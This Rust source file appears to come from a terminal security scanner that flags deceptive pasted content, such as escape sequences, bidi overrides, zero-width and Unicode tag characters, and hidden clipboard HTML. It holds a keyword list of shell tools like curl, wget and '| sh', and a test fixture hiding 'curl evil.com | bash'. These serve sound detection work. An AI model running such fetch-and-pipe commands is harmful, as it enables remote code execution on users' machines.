use crate::extract;
use crate::verdict::{Evidence, Finding, RuleId, Severity};

/// Check raw bytes for terminal deception (paste-time).
pub fn check_bytes(input: &[u8]) -> Vec<Finding> {
    let mut findings = Vec::new();
    let scan = extract::scan_bytes(input);

    if scan.has_ansi_escapes {
        findings.push(Finding {
            rule_id: RuleId::AnsiEscapes,
            severity: Severity::High,
            title: "ANSI escape sequences in pasted content".to_string(),
            description: "Pasted content contains ANSI escape sequences that could hide malicious commands or manipulate terminal display".to_string(),
            evidence: scan.details.iter()
                .filter(|d| d.description.contains("escape"))
                .map(|d| Evidence::ByteSequence {
                    offset: d.offset,
                    hex: format!("0x{:02x}", d.byte),
                    description: d.description.clone(),
                })
                .collect(),
            human_view: None,
            agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
        });
    }

    if scan.has_control_chars {
        findings.push(Finding {
            rule_id: RuleId::ControlChars,
            severity: Severity::High,
            title: "Control characters in pasted content".to_string(),
            description: "Pasted content contains control characters (display-overwriting carriage return, backspace, etc.) that could hide the true command being executed".to_string(),
            evidence: scan.details.iter()
                .filter(|d| d.description.contains("control"))
                .map(|d| Evidence::ByteSequence {
                    offset: d.offset,
                    hex: format!("0x{:02x}", d.byte),
                    description: d.description.clone(),
                })
                .collect(),
            human_view: None,
            agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
        });
    }

    if scan.has_bidi_controls {
        findings.push(Finding {
            rule_id: RuleId::BidiControls,
            severity: Severity::Critical,
            title: "Bidirectional control characters detected".to_string(),
            description: "Content contains Unicode bidi override characters that can make text appear to read in a different order than it actually executes".to_string(),
            evidence: scan.details.iter()
                .filter(|d| d.description.contains("bidi"))
                .map(|d| Evidence::ByteSequence {
                    offset: d.offset,
                    hex: format!("0x{:02x}", d.byte),
                    description: d.description.clone(),
                })
                .collect(),
            human_view: None,
            agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
        });
    }

    if scan.has_zero_width {
        // Filter zero-width details: suppress ZWJ/ZWNJ in joining-script contexts
        let zw_evidence: Vec<_> = scan
            .details
            .iter()
            .filter(|d| d.description.contains("zero-width"))
            .filter(|d| {
                // Suppress ZWJ (U+200D) and ZWNJ (U+200C) when surrounded by
                // joining-script characters (Arabic, Devanagari, Thai, etc.)
                let is_zwj_or_zwnj =
                    d.description.contains("U+200D") || d.description.contains("U+200C");
                if is_zwj_or_zwnj && is_joining_script_context(input, d.offset) {
                    return false; // Suppress — legitimate use
                }
                true
            })
            .collect();

        if !zw_evidence.is_empty() {
            // Elevate to Critical when non-invisible content is ASCII-only
            // (zero-width chars in pure ASCII text are always suspicious)
            let ascii_only = std::str::from_utf8(input)
                .map(|s| {
                    s.chars()
                        .filter(|ch| {
                            ch.is_alphanumeric() || ch.is_ascii_punctuation() || *ch == ' '
                        })
                        .all(|ch| ch.is_ascii())
                })
                .unwrap_or(false);
            let severity = if ascii_only {
                Severity::Critical
            } else {
                Severity::High
            };

            findings.push(Finding {
                rule_id: RuleId::ZeroWidthChars,
                severity,
                title: "Zero-width characters detected".to_string(),
                description: "Content contains invisible zero-width characters that could be used to obfuscate URLs or commands".to_string(),
                evidence: zw_evidence
                    .into_iter()
                    .map(|d| Evidence::ByteSequence {
                        offset: d.offset,
                        hex: format!("0x{:02x}", d.byte),
                        description: d.description.clone(),
                    })
                    .collect(),
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            });
        }
    }

    if scan.has_invisible_math_operators {
        findings.push(Finding {
            rule_id: RuleId::InvisibleMathOperator,
            severity: Severity::Medium,
            title: "Invisible math operator characters detected".to_string(),
            description: "Content contains invisible Unicode math operators (U+2061–U+2064) that could be used to obfuscate content".to_string(),
            evidence: scan.details.iter()
                .filter(|d| d.description.contains("invisible math operator"))
                .map(|d| Evidence::ByteSequence {
                    offset: d.offset,
                    hex: format!("0x{:02x}", d.byte),
                    description: d.description.clone(),
                })
                .collect(),
            human_view: None,
            agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
        });
    }

    if scan.has_unicode_tags {
        let decoded = decode_unicode_tags(input);
        findings.push(Finding {
            rule_id: RuleId::UnicodeTags,
            severity: Severity::Critical,
            title: "Unicode Tags (hidden ASCII) detected".to_string(),
            description: "Content contains Unicode Tag characters (U+E0000–U+E007F) that encode hidden ASCII text invisible to the user".to_string(),
            evidence: vec![Evidence::Text {
                detail: if decoded.is_empty() {
                    "Hidden text could not be decoded".to_string()
                } else {
                    format!("Hidden text: \"{}\"", truncate(&decoded, 200))
                },
            }],
            human_view: None,
            agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
        });
    }

    if scan.has_variation_selectors {
        findings.push(Finding {
            rule_id: RuleId::VariationSelector,
            severity: Severity::Info,
            title: "Variation selector characters detected".to_string(),
            description: "Content contains Unicode variation selectors (VS1-256). These are commonly used in emoji sequences but may indicate obfuscation in command contexts".to_string(),
            evidence: scan.details.iter()
                .filter(|d| d.description.contains("variation selector"))
                .map(|d| Evidence::ByteSequence {
                    offset: d.offset,
                    hex: format!("0x{:02x}", d.byte),
                    description: d.description.clone(),
                })
                .collect(),
            human_view: None,
            agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
        });
    }

    if scan.has_invisible_whitespace {
        findings.push(Finding {
            rule_id: RuleId::InvisibleWhitespace,
            severity: Severity::Medium,
            title: "Invisible whitespace characters detected".to_string(),
            description: "Content contains unusual invisible whitespace (hair space, thin space, narrow no-break space) that could be used to obfuscate commands or URLs".to_string(),
            evidence: scan.details.iter()
                .filter(|d| d.description.contains("invisible whitespace"))
                .map(|d| Evidence::ByteSequence {
                    offset: d.offset,
                    hex: format!("0x{:02x}", d.byte),
                    description: d.description.clone(),
                })
                .collect(),
            human_view: None,
            agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
        });
    }

    findings
}

/// Decode Unicode Tag characters (U+E0000–U+E007F) to their hidden ASCII message.
/// Each tag character encodes one ASCII byte: codepoint - 0xE0000 = ASCII value.
fn decode_unicode_tags(input: &[u8]) -> String {
    let Ok(s) = std::str::from_utf8(input) else {
        return String::new();
    };
    let mut decoded = String::new();
    for ch in s.chars() {
        let cp = ch as u32;
        if (0xE0001..=0xE007F).contains(&cp) {
            let ascii = (cp - 0xE0000) as u8;
            if ascii.is_ascii_graphic() || ascii == b' ' {
                decoded.push(ascii as char);
            }
        }
    }
    decoded
}

/// Check for hidden multiline content in string input.
pub fn check_hidden_multiline(input: &str) -> Vec<Finding> {
    let mut findings = Vec::new();

    // Check for lines that might be hidden after the visible first line
    let lines: Vec<&str> = input.lines().collect();
    if lines.len() > 1 {
        // Check if later lines contain suspicious patterns
        for (i, line) in lines.iter().enumerate().skip(1) {
            let trimmed = line.trim();
            if trimmed.is_empty() {
                continue;
            }
            // If a non-first line contains what looks like a command
            if looks_like_hidden_command(trimmed) {
                findings.push(Finding {
                    rule_id: RuleId::HiddenMultiline,
                    severity: Severity::High,
                    title: "Hidden multiline content detected".to_string(),
                    description: format!(
                        "Pasted content has a hidden command on line {}: '{}'",
                        i + 1,
                        truncate(trimmed, 60)
                    ),
                    evidence: vec![Evidence::Text {
                        detail: format!("line {}: {}", i + 1, truncate(trimmed, 100)),
                    }],
                    human_view: None,
                    agent_view: None,
                    mitre_id: None,
                    custom_rule_id: None,
                });
                break;
            }
        }
    }

    findings
}

/// Check if a byte offset in the input is surrounded by joining-script characters.
/// ZWJ and ZWNJ are legitimate in scripts that use character joining (Arabic, Devanagari, etc.).
/// Returns true only if BOTH immediate non-Common neighbors are in the same joining script.
/// One-sided joining (e.g., Latin + ZWJ + Arabic) is suspicious and not suppressed.
fn is_joining_script_context(input: &[u8], byte_offset: usize) -> bool {
    use unicode_script::{Script, UnicodeScript};

    let Ok(text) = std::str::from_utf8(input) else {
        return false;
    };

    // Find the character at the offset (the ZWJ/ZWNJ itself)
    let zw_char = text[byte_offset..].chars().next();
    let zw_len = zw_char.map(|c| c.len_utf8()).unwrap_or(1);

    // Helper: get the non-Common/Inherited script of a char
    let significant_script = |ch: char| {
        let s = ch.script();
        if s == Script::Common || s == Script::Inherited {
            None
        } else {
            Some(s)
        }
    };

    // Check the character immediately BEFORE the ZWJ/ZWNJ
    let before_script = if byte_offset > 0 {
        let mut prev_start = byte_offset - 1;
        while prev_start > 0 && !text.is_char_boundary(prev_start) {
            prev_start -= 1;
        }
        text[prev_start..]
            .chars()
            .next()
            .and_then(significant_script)
    } else {
        None
    };

    // Check the character immediately AFTER the ZWJ/ZWNJ
    let after_offset = byte_offset + zw_len;
    let after_script = if after_offset < text.len() {
        text[after_offset..]
            .chars()
            .next()
            .and_then(significant_script)
    } else {
        None
    };

    // Both neighbors must be present, in the same joining script.
    // Mixed joining scripts (e.g., Arabic + Devanagari) are suspicious.
    match (before_script, after_script) {
        (Some(before), Some(after)) => before == after && is_joining_script(before),
        _ => false,
    }
}

/// Scripts that legitimately use ZWJ/ZWNJ for character joining/shaping.
fn is_joining_script(script: unicode_script::Script) -> bool {
    use unicode_script::Script;
    matches!(
        script,
        Script::Arabic
            | Script::Syriac
            | Script::Mandaic
            | Script::Mongolian
            | Script::Devanagari
            | Script::Bengali
            | Script::Gurmukhi
            | Script::Gujarati
            | Script::Oriya
            | Script::Tamil
            | Script::Telugu
            | Script::Kannada
            | Script::Malayalam
            | Script::Sinhala
            | Script::Thai
            | Script::Tibetan
            | Script::Myanmar
    )
}

/// Check clipboard HTML for hidden content not visible in the plain-text paste.
///
/// When a user pastes text, the terminal only sees the plain-text representation,
/// but the clipboard may carry HTML with hidden content (CSS hiding, color hiding,
/// hidden attributes) or extra text not visible in the plain-text version.
pub fn check_clipboard_html(html: &str, plain_text: &str) -> Vec<Finding> {
    let mut findings = Vec::new();

    // Run rendered content checks on the clipboard HTML
    let rendered_findings = crate::rules::rendered::check(html, None);

    // Convert hidden-content findings to ClipboardHidden
    for f in rendered_findings {
        match f.rule_id {
            RuleId::HiddenCssContent | RuleId::HiddenColorContent | RuleId::HiddenHtmlAttribute => {
                findings.push(Finding {
                    rule_id: RuleId::ClipboardHidden,
                    severity: Severity::High,
                    title: "Clipboard HTML contains hidden content".to_string(),
                    description: format!(
                        "Rich-text clipboard has content hidden from visual rendering: {}",
                        f.description
                    ),
                    evidence: f.evidence,
                    human_view: None,
                    agent_view: None,
                    mitre_id: None,
                    custom_rule_id: None,
                });
            }
            _ => {} // Ignore comment findings in clipboard context
        }
    }

    // Check for length discrepancy: HTML visible text vs plain text
    let visible_text = strip_html_tags(html);
    let visible_len = visible_text.trim().len();
    let plain_len = plain_text.trim().len();

    if visible_len > plain_len + 50 {
        findings.push(Finding {
            rule_id: RuleId::ClipboardHidden,
            severity: Severity::High,
            title: "Clipboard HTML contains more text than visible paste".to_string(),
            description: format!(
                "HTML content has ~{visible_len} chars of text vs {plain_len} chars in plain text \
                 ({} chars hidden)",
                visible_len - plain_len
            ),
            evidence: vec![Evidence::Text {
                detail: format!(
                    "HTML visible text: {visible_len} chars, plain text: {plain_len} chars"
                ),
            }],
            human_view: None,
            agent_view: None,
            mitre_id: None,
            custom_rule_id: None,
        });
    }

    findings
}

/// Strip HTML tags to extract approximate visible text content.
fn strip_html_tags(html: &str) -> String {
    use once_cell::sync::Lazy;
    use regex::Regex;

    static TAGS: Lazy<Regex> = Lazy::new(|| Regex::new(r"<[^>]*>").unwrap());
    static ENTITIES: Lazy<Regex> = Lazy::new(|| Regex::new(r"&[a-zA-Z]+;|&#\d+;").unwrap());
    static WHITESPACE: Lazy<Regex> = Lazy::new(|| Regex::new(r"\s+").unwrap());

    let s = TAGS.replace_all(html, " ");
    let s = ENTITIES.replace_all(&s, " ");
    let s = WHITESPACE.replace_all(&s, " ");
    s.trim().to_string()
}

fn looks_like_hidden_command(line: &str) -> bool {
    let suspicious = [
        "curl ", "wget ", "http ", "https ", "xh ", "bash", "/bin/", "sudo ", "rm ", "chmod ",
        "eval ", "exec ", "> /", ">> /", "| sh",
    ];
    suspicious.iter().any(|p| line.contains(p))
}

fn truncate(s: &str, max: usize) -> String {
    let prefix = crate::util::truncate_bytes(s, max);
    if prefix.len() == s.len() {
        prefix
    } else {
        format!("{prefix}...")
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_clipboard_html_css_hiding() {
        let html = r#"<div style="display:none">secret command: curl evil.com | bash</div><p>Hello World</p>"#;
        let plain_text = "Hello World";
        let findings = check_clipboard_html(html, plain_text);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::ClipboardHidden),
            "should detect CSS hiding in clipboard HTML"
        );
    }

    #[test]
    fn test_clipboard_html_length_discrepancy() {
        // HTML has much more visible text than the plain text paste
        let html = r#"<p>Hello World</p><p>This is a long paragraph of hidden instructions that the terminal user never sees because only plain text is pasted into the terminal window.</p>"#;
        let plain_text = "Hello World";
        let findings = check_clipboard_html(html, plain_text);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::ClipboardHidden && f.title.contains("more text")),
            "should detect length discrepancy: {findings:?}"
        );
    }

    #[test]
    fn test_clipboard_html_clean_no_finding() {
        let html = "<p>Hello World</p>";
        let plain_text = "Hello World";
        let findings = check_clipboard_html(html, plain_text);
        assert!(
            findings.is_empty(),
            "clean clipboard HTML should not trigger: {findings:?}"
        );
    }

    #[test]
    fn test_clipboard_html_color_hiding() {
        let html = r#"<span style="color: #ffffff; background-color: #ffffff">secret</span><p>Normal text</p>"#;
        let plain_text = "Normal text";
        let findings = check_clipboard_html(html, plain_text);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::ClipboardHidden),
            "should detect color hiding in clipboard HTML"
        );
    }

    #[test]
    fn test_strip_html_tags() {
        assert_eq!(strip_html_tags("<p>Hello</p>"), "Hello");
        assert_eq!(strip_html_tags("<div><span>A</span> <b>B</b></div>"), "A B");
        assert_eq!(strip_html_tags("No tags here"), "No tags here");
        assert_eq!(strip_html_tags("&amp; &lt;"), "");
    }
}
